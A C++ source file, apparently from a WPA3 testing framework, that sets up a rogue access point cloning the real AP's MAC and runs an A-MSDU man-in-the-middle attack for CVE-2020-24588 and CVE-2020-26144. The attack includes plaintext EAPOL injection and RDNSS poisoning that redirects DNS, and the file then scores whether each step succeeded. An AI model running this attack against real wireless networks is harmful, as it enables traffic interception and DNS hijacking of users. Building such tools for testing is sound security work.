#include "attacks/mc_mitm/amsdu/amsdu_attack.h"

#include <nlohmann/json.hpp>
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/amsdu/amsdu.h"
#include "attacks/mc_mitm/mc_mitm_attack.h"
#include "config/RunStatus.h"
#include "logger/log.h"
#include "observer/dmesg_wrapper.h"
#include "visual/result_helper.h"

using namespace std;

namespace wpa3_tester::amsdu {

void setup_attack(RunStatus &rs) {
    rs.get_actor("rogue_ap")->set_mac_address(rs.get_actor("ap").get(SK::permanent_mac));
    components::client_ap_setup_t(rs);
}

void run_attack(RunStatus &rs) {
    const auto rogue_client = rs.get_actor("rogue_client");
    const auto rogue_ap     = rs.get_actor("rogue_ap");
    const auto client       = rs.get_actor("client");
    const auto ap           = rs.get_actor("ap");

    rogue_client->set_iface_up();
    rogue_ap->set_iface_up();

    const auto &cfg = rs.config().at("attack_config");

    AmsduAttack attack(rogue_client, rogue_ap, client, ap, rs.run_folder());
    attack.watch_inner_size   = cfg.value("watch_inner_size",   static_cast<size_t>(0));
    attack.inject_eapol_amsdu = cfg.value("inject_eapol_amsdu", false);
    attack.attacker_dns_v6    = cfg.value("attacker_dns_v6",    string("::1"));
    attack.victim_ip          = cfg.value("victim_ip",          client.get(SK::ip_addr));
    attack.trigger_count      = cfg.value("trigger_count",      3);

    if(attack.watch_inner_size > 0)
        log(LogLevel::INFO, "A-MSDU CVE-2020-24588 mode: watching inner frame size = {}", attack.watch_inner_size);
    if(attack.inject_eapol_amsdu)
        log(LogLevel::INFO, "A-MSDU CVE-2020-26144 mode: will inject plaintext EAPOL A-MSDU after MitM");

    rs.get_observer("sta_ap_iperf3").start(rs);

    // capture DNS queries arriving at attacker_dns_v6 - evidence of successful RDNSS poisoning
    // runs in AP's netns so it sees client->172.16.100.1 traffic (attacker_dns_v6 = ::ffff:172.16.100.1)
    {
        vector<string> cmd = {"tshark", "-i", "any", "-f", "udp port 53", "-l"};
        if(ap[SK::netns])
            cmd.insert(cmd.begin(), {"ip", "netns", "exec", ap.get(SK::netns)});
        rs.process_manager.run("attacker_dns_cap", cmd, rs.run_folder());
    }

    rs.process_manager.write_log_all(ATTACK_START_tag);
    attack.run(rs, cfg.at("attack_time").get<int>());
    rs.process_manager.write_log_all(ATTACK_STOP_tag);
}

void stats_attack(const RunStatus &rs) {
    mc_mitm::stats(rs);

    const string mac_str = rs.get_actor("client").get(SK::mac);
    const auto window    = visual::helper::get_run_window(rs);

    const auto state_log  = rs.run_folder() / "observer" / "client_state" / (mac_str + "_state.log");
    const auto tester_log = rs.run_folder() / "logger" / "tester.log";

    const bool got_mitm       = !observer::dmesg::grep_log(state_log,  "GotMitm",                      window).empty();
    const bool injected_26144 = !observer::dmesg::grep_log(tester_log, "CVE-2020-26144: injecting",     window).empty();
    const bool flipped_24588  = !observer::dmesg::grep_log(tester_log, "CVE-2020-24588: trigger frame", window).empty();

    // DNS query arriving at attacker machine -> client used poisoned RDNSS server
    // tshark packet summary format: "... IP_SRC -> IP_DST DNS ..."
    const auto dns_log    = rs.run_folder() / "logger" / "attacker_dns_cap.log";
    const bool dns_queried = !observer::dmesg::grep_log(dns_log, " DNS ").empty();

    nlohmann::json result{};
    result["got_mitm"]       = got_mitm;
    result["injected_26144"] = injected_26144;
    result["flipped_24588"]  = flipped_24588;
    result["dns_queried"]    = dns_queried;
    rs.save_result(result);
}

}
